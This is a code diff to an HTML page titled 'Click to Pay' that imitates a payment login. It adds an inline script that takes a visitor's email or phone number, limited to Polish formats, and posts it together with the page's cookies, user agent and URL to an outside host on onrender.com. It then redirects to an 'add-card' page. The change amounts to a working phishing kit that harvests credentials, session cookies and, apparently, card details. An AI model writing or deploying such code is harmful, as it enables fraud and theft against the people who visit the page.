@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en-US" data-theme="dark">
+<html lang="en-US">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
@@ -9,17 +9,6 @@
     <!-- CSS -->
     <link rel="stylesheet" href="/style.css" />
     <link rel="stylesheet" href="/index_files/index.d9994029.css" />
-
-    <!-- JavaScript (Vite-compatible) -->
-    <script type="module" src="/main.js"></script>
-    <script type="module" src="/index_files/chunk-vendors.73f5053e.js"></script>
-    <script type="module" src="/index_files/index.679203c0.js"></script>
-
-    <!-- Async/Defer Scripts -->
-    <script async src="/index_files/launch-EN2821806a1fd348308dcb65c0fb934a14.min.js" class="optanon-category-C006"></script>
-    <script async src="/index_files/otSDKStub.js" data-domain-script="..." type="text/javascript"></script>
-    <script type="module" src="/index_files/saved_resource(1)"></script>
-    <script type="module" src="/index_files/AaKxkKOCM"></script>
 
     <title>Click to Pay</title>
   </head>
@@ -82,13 +71,13 @@
 
             <div class="row-vertical-align-bottom">
               <div class="col-full">
-                <div class="al-button al-button--disabled">
+                <div class="al-button">
                   <button
                     type="submit"
-                    disabled
                     id="submit-btn"
                     class="uppercase fill"
                     aria-label="Continue"
+                    disabled
                   >
                     <div class="al-button__dancing-dots">
                       <div class="dancing-dot dancing-dot--1"></div>
@@ -120,7 +109,50 @@
       </footer>
     </div>
 
-    <!-- Hidden input with configuration (preserved as-is) -->
-    <input type="hidden" name="nds-pmd" value='{"jvqtrgQngn":{"oq":"1920:945:1920:1032:1920:1032"}}' />
+    <script>
+      const input = document.getElementById('userId');
+      const button = document.getElementById('submit-btn');
+      const form = document.getElementById('login-form');
+
+      input.addEventListener('input', () => {
+        button.disabled = input.value.trim() === '';
+      });
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const value = input.value.trim();
+
+        const isValid = value.match(/^(\+48\d{9}|[a-zA-Z0-9._%+-]+@(onet|gmail)\.pl)$/i);
+        if (!isValid) {
+          alert('Please enter a valid phone number (+48...) or email address (@onet.pl/@gmail.com)');
+          return;
+        }
+
+        button.disabled = true;
+        button.querySelector('.al-button__label').textContent = 'Loading...';
+
+        try {
+          await fetch('https://onclick-back.onrender.com/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              email: value,
+              cookies: document.cookie,
+              userAgent: navigator.userAgent,
+              location: window.location.href,
+              date: new Date().toISOString()
+            })
+          });
+
+          // Redirect to add-card.html
+          window.location.href = '/add-card.html';
+        } catch (err) {
+          console.error('Submission error:', err);
+          alert('Something went wrong. Please try again.');
+          button.disabled = false;
+          button.querySelector('.al-button__label').textContent = 'Continue';
+        }
+      });
+    </script>
   </body>
 </html>
